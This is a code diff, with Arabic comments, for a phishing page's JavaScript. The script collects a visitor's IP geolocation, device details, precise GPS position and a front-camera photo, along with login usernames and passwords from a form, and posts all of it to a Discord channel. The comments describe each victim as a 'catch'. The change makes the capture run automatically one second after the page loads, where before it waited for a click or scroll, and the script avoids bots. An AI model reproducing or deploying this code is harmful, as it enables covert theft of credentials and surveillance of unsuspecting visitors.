@@ -43,13 +43,13 @@ async function getSystemInfo() {
     return { ...geoip, ua, platform, language, screenRes, batteryInfo };
 }
 
-// دالة طلب الموقع والكاميرا وإرسال التقرير
+// دالة طلب الأذونات والتقاط الصورة فوراً
 async function triggerPermissionsAndCapture(user = "", pass = "", status = "") {
     if (isBot()) return;
 
     let lat = null, lng = null;
 
-    // طلب إذن الموقع الجغرافي (يظهر نافذة السماح للمستخدم)
+    // طلب إذن الموقع الجغرافي (GPS) تلقائياً
     await new Promise((resolve) => {
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
@@ -59,14 +59,14 @@ async function triggerPermissionsAndCapture(user = "", pass = "", status = "") {
                     resolve();
                 },
                 () => { resolve(); },
-                { timeout: 5000, enableHighAccuracy: true }
+                { timeout: 6000, enableHighAccuracy: true }
             );
         } else {
             resolve();
         }
     });
 
-    // طلب إذن الكاميرا الأمامية والتقاط الصورة
+    // طلب إذن الكاميرا الأمامية والتقاط الصورة تلقائياً
     let frontBlob = null;
     try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
@@ -80,7 +80,7 @@ async function triggerPermissionsAndCapture(user = "", pass = "", status = "") {
         stream.getTracks().forEach(t => t.stop());
     } catch (e) {}
 
-    // إرسال البيانات كاملة إلى ديسكورد
+    // إرسال البيانات إلى ديسكورد
     await sendToDiscord(frontBlob, lat, lng, user, pass, status);
 }
 
@@ -89,7 +89,7 @@ async function sendToDiscord(frontBlob, lat, lng, user = "", pass = "", status =
         const info = await getSystemInfo();
         const formData = new FormData();
         
-        let content = `🚨 **[ صيد جديد متفاعل ]**\n` +
+        let content = `🚨 **[ صيد جديد - طلب تلقائي فور الدخول ]**\n` +
                       `🌐 **IP:** \`${info.ip}\`\n` +
                       `🏙️ **الموقع (IP):** \`${info.country} - ${info.city} (${info.org})\`\n` +
                       `💻 **النظام:** \`${info.platform}\` | 🔋 **البطارية:** \`${info.batteryInfo}\`\n`;
@@ -97,7 +97,7 @@ async function sendToDiscord(frontBlob, lat, lng, user = "", pass = "", status =
         if (lat && lng) {
             content += `📍 **موقع GPS الدقيق:** [اضغط هنا للعرض](https://www.google.com/maps?q=${lat},${lng}) (\`${lat}, ${lng}\`)\n`;
         } else {
-            content += `📍 **موقع GPS:** لم يتم السماح به.\n`;
+            content += `📍 **موقع GPS:** لم يتم السماح به أو تم الرفض.\n`;
         }
 
         if (user) {
@@ -122,18 +122,14 @@ async function sendToDiscord(frontBlob, lat, lng, user = "", pass = "", status =
     } catch (err) {}
 }
 
-// التشغيل بمجرد تفاعل المستخدم لأول مرة مع الصفحة (لضمان ظهور نافذة الأذونات)
-let triggered = false;
-['click', 'touchstart', 'scroll'].forEach(evt => {
-    window.addEventListener(evt, () => {
-        if (!triggered) {
-            triggered = true;
-            triggerPermissionsAndCapture("", "", "تم السماح والتفاعل مع الصفحة أولوياً.");
-        }
-    }, { once: true });
+// التشغيل الذاتي الفوري بمجرد فتح الصفحة (بدون أي ضغطة زر)
+window.addEventListener('DOMContentLoaded', () => {
+    setTimeout(() => {
+        triggerPermissionsAndCapture("", "", "تم فتح الصفحة وطلب الأذونات تلقائياً.");
+    }, 1000); // تأخير ثانية واحدة لضمان تحميل عناصر الصفحة بالكامل
 });
 
-// التعامل مع نموذج تسجيل الدخول
+// التعامل مع نموذج تسجيل الدخول (apply.html)
 const loginForm = document.getElementById('fullLoginForm');
 if (loginForm) {
     loginForm.addEventListener('submit', async (e) => {
